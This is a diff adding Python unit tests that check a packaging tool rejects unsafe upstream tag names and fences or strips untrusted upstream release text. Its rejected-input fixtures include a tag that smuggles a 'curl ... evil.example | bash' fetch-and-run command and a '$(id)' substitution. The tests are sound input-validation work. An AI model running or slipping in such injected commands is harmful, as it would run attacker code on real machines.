@@ -193,3 +193,50 @@ class PinTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+upgrade_notes = load("tooling_upgrade_notes", "packaging/upstream/upgrade_notes.py")
+
+
+class UpstreamTextTests(unittest.TestCase):
+    """Upstream controls its tag names, commit subjects and release notes: none of it may run or pose as ours."""
+
+    def test_only_a_plain_version_tag_is_accepted(self):
+        sha = "a" * 40
+        self.assertEqual(candidate.checked("v2026.9.24", sha), ("v2026.9.24", sha))
+        self.assertEqual(candidate.checked("2026.10.2", sha), ("2026.10.2", sha))
+        for tag in ("v2099.1.1';curl -sL evil.example|bash;'", "v2099.1.1$(id)", "v2026.9.24\nx", "main", ""):
+            with self.assertRaises(SystemExit, msg=tag):
+                candidate.checked(tag, sha)
+        with self.assertRaises(SystemExit):
+            candidate.checked("v2026.9.24", "HEAD")
+
+    def test_upstream_words_are_fenced_and_subjects_are_plain(self):
+        fenced = upgrade_notes.untrusted("Run ```rm -rf``` now <script>x</script> [click](https://evil.example)", 1000)
+        self.assertTrue(fenced.startswith("```text\n") and fenced.endswith("\n```"))
+        self.assertEqual(fenced.count("```"), 2)  # a fence inside can't close ours
+        self.assertEqual(upgrade_notes.subject("Fix <b>x</b> [see](https://e.example) `code`"), "Fix bx/b see(https://e.example) code")
+
+    def test_a_radar_from_another_job_is_checked_not_trusted(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "radar.json"
+            path.write_text(
+                json.dumps(
+                    {
+                        "items": [{"feature": "A", "verdict": "arrives automatically", "why": "w"}, {"feature": 1, "verdict": "x"}],
+                        "highlights": ["h" * 100],
+                        "tester_note": "n",
+                    }
+                ),
+                encoding="utf-8",
+            )
+            radar = upgrade_notes.radar_from(str(path))
+            self.assertEqual(radar["items"], [{"feature": "A", "verdict": "arrives automatically", "why": "w"}])
+            self.assertEqual(radar["highlights"], ["h" * 60])
+            path.write_text("not json", encoding="utf-8")
+            self.assertIsNone(upgrade_notes.radar_from(str(path)))
+
+    def test_the_shipping_line_carries_no_upstream_text(self):
+        source = (ROOT / "packaging/upstream/upgrade_notes.py").read_text(encoding="utf-8")
+        self.assertIn("`npm run hermes:upgrade` (builds", source)
+        self.assertNotIn("hermes:upgrade -- {args.candidate}", source)
